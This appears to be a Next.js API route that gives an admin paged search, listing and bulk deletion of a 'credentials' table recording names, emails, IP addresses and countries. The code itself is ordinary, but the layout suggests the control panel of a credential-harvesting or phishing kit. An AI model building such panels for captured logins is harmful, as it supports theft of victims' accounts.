import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';
import { requireAdmin } from '@/lib/auth';

export async function GET(req: NextRequest) {
  const auth = requireAdmin(req);
  if (!auth) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const db = getDb();
  const { searchParams } = new URL(req.url);
  const search = (searchParams.get('search') || '').trim();
  const page = Math.max(1, parseInt(searchParams.get('page') || '1'));
  const perPage = 25;
  const offset = (page - 1) * perPage;

  let creds: any[];
  let total: number;

  if (search) {
    const like = `%${search}%`;
    creds = db.prepare(`SELECT * FROM credentials WHERE name LIKE ? OR email LIKE ? OR ip LIKE ? OR country LIKE ? ORDER BY created_at DESC LIMIT ? OFFSET ?`)
      .all(like, like, like, like, perPage, offset);
    total = (db.prepare(`SELECT COUNT(*) as c FROM credentials WHERE name LIKE ? OR email LIKE ? OR ip LIKE ? OR country LIKE ?`).get(like, like, like, like) as any).c;
  } else {
    creds = db.prepare('SELECT * FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?').all(perPage, offset);
    total = (db.prepare('SELECT COUNT(*) as c FROM credentials').get() as any).c;
  }

  return NextResponse.json({ status: 'ok', data: creds, total, page, totalPages: Math.ceil(total / perPage) });
}

export async function DELETE(req: NextRequest) {
  const auth = requireAdmin(req);
  if (!auth) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const db = getDb();
  const { searchParams } = new URL(req.url);

  if (searchParams.get('all') === 'true') {
    db.prepare('DELETE FROM credentials').run();
  } else {
    const id = parseInt(searchParams.get('id') || '');
    if (id) db.prepare('DELETE FROM credentials WHERE id = ?').run(id);
  }

  return NextResponse.json({ status: 'ok' });
}
